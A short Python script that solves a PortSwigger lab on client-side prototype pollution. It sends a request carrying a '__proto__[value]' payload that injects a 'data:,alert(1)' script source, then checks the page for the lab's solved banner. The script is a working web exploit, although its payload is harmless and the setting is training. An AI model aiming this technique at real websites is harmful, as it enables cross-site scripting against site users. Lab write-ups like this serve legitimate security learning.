""" Intended for Portswigger Lab: Client-side prototype pollution via browser APIs """
import requests
import argparse
import re

def pollute_object(target_url):
    pollute_url = target_url + "/?__proto__[value]=data:,alert(1);"
    print("Sending polluted request")
    r = requests.get(pollute_url, timeout=5)

    print("Checking for successful XSS")
    r = requests.get(target_url, timeout=5)
    solved_indicator = re.compile(rb"<section class=\'academyLabBanner is-solved\'>")
    if re.search(solved_indicator, r.content):
        print("Lab solved!")
    else:
        print("Unsuccessful ")

if __name__ == "__main__":

    parser = argparse.ArgumentParser()

    parser.add_argument("--url","-u",help="Target URL", required=True)

    args = parser.parse_args()

    target_url = args.url

    pollute_object(target_url)